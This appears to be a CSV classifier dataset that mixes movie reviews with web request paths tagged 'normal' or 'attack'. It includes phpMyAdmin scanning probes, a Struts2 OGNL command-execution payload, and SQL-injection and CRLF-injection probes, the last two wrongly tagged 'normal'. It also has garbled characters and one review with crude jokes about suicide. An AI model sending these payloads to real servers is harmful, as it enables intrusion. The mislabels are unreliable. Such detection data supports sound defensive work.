post,tags
"Wow. I thought, Eskimo Limon was the most awful and embarrassing first-sex movie ever. But I had forgotten that Germany always tries to compete. In this case, the well-known German film producer Bernd Eichinger was successful in producing even worse crap. Harte Jungs is stupid, not believable and predictable, and above all: not funny. It's almost a tragedy that so many kids went to see this in Germany (and, I'm afraid, also Austria).<br /><br />Tobias Schenke, 19, looks too nice to have no girlfriend and too ripe to be 15, and his character is too dumb to be true. Schenke tries real hard to make us believe that he doesn't know ANYthing about sex, but that doesn't help. Harte Jungs seems to be made by someone who watched Al Bundy and took him too seriously.<br /><br />The best actors in the movie are Sissi Perlinger and Stefan J殲gens who play Schenke's semi-liberal parents. Perlinger and J殲gens are stand-up comedians who are not particularly talented in movie acting. Still, their performances are the `best' and `funniest' in comparison.<br /><br />A complete failure.",normal
/phpmyadmin1/index.php,normal
"I love this show. My girlfriend was gonna get an abortion until we both watched Wonder Showzen one night. Luckily, she killed herself before the baby was born. Though technically I think it was considered a murder-suicide.<br /><br />My first thoughts upon seeing Wonder Showzen? Now I know what God watches when He jerks off all the time.<br /><br />Wonder Showzen is to television what a toaster in the bathtub is to my self-esteem.<br /><br />You know how George W. Bush makes speaking gaffes all the time? Tyler wouldn't. Tyler's good. Tyler cuts his nails. He's Tyler. He's good. Tyyyllerrr...",normal
/examples/readonly.html,normal
/cgi-bin/mt/mt-search.cgi?IncludeBlogs=2&search=php and 1>1,normal
/mt/know-how/2017/04/how-to-use-stored-procedure-in-php.html,normal
/evox/about,normal
408,normal
"I saw this at the 2004 Stony Brook Film Festival in NY and it was very warmly received. In this pre-WW2 film, a pair of German rocket scientists are working on the Scottish Isle of Scarp as war looms on the horizon. The characters encountered on the island are priceless in their creation and their portrayal. Shauna MacDonald is particularly memorable<br /><br />After getting up to speed on the ""Scootish"" accents, the viewer feel right at home with these folk who watch with amusement as the Germans work to link their isle with the mainland via a rocket-based mail delivery. As implausible as it seems, this film was based on an actual story.<br /><br />All in all, a memorable film that will stay with you for some time thanks to its casting, its story or its scenery.",normal
/struts_chat/board/board.action,normal
"I am and have been a serious collector of Christmas related movies, TV shows, holidays specials, etc., for over twenty-five years. Please heed my warning and do not be mislead by sterling reviews & media hype about this movie. This is not a Muppett movie as we have come to know them, and is certainly NOT for children. The fact that this was produced for a major TV network is/was no surprise considering their level of operation at this time. What is hard for me to believe, is that The Jim Henson organization stooped so low to become involved in this travesty of Christmas.I wish there had been reviews for me to read that would warned me before I wasted my hard earned money on this piece of trash.",normal
/phpmyadmin1/index.php,normal
/claroline/phpMyAdmin/index.php,normal
/phpmyadmin2/index.php,normal
"Well acted, yes. Very well, I must say, even though I don't speak Chezck. Nice cinematography. But the script is lame, really lame. A predictable soap opera, in which you know exactly everything that is going to happen. OK, maybe the ending isn't as predictable, but is it any good? It is one of those films that you have the feeling that have seen already, and forget about the day after.<br /><br />I just got a note from IMDb saying that my comment was not long enough. That's really sad, because I have no idea of what else to say about this movie, which actually says a a lot about it, don't you think? The thing is.. .It has no soul and no originality. Compare this movie with Barrio, or Riff Raff, shot more than ten years ago (or the extraordinary recently shot The Child). It's sad to see that this is a much worse film.",normal
/favicon.ico,normal
"I saw the film at the Brooklyn International Film Festival (World Premiere).<br /><br />A haunting, intimate portrait of Loneliness, and the repercussions of letting it grow and turn into something darker.<br /><br />The acting of the two leads (Jessica Bohl & Richard Brundage) is excellent, and makes one wish you had met these characters before they became so damaged.<br /><br />Reminded me in theme of the works of Atom Egoyan (Exotica) and Raymond Carver (Where I'm Calling From).<br /><br />The Soundtrack (Tywanna Jo Baskette, Crooked Fingers) is excellent and reinforces moments in the film without drawing attention to itself.<br /><br />Highly recommend the Film and the Soundtrack.",normal
/mt/mt-static/addons/Community.pack/themes/tristan-blue/comment-icon.gif,normal
"/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=pwd",attack
/?cat=\\r\\nLocation: http://www.reverse-edge.com,normal
"Like most, I rented this after I heard the universal praise. And despite COUNTLESS bizarre, unexplainable moments along the way, I was very interested and entertained through 100 minutes of the film. Then the two women went to the ""performance"" late at night. The rest of movie (which is another 40 minutes by the way) is even WEIRDER than the first part AND completely contradict and dump on what I had already seen. Then the movie abruptly ends.<br /><br />Baffled, I wandered over to my computer to see if I could buy a clue as to what just happened. Nothing made sense, and I'm a pretty clever guy. None of these other user comments made sense, even when they say ""SPOILERS."" I still have no idea what they're saying. Someone's dream? Not real? Then what's the point of a 2 hour 30 minute movie if it's ""not real?"" Or is it real? I'm forced to make a choice. Either:<br /><br />[a] The movie is a work of genius on a MENSA level and I'm simply too stupid to understand it.<br /><br />[b] The movie is weird for weird's sake and just doesn't make sense. Everyone who loves it is trying to save face and pretend like they ""get"" it.<br /><br />I choose [b]. Screw you guys, I'm going home...",normal
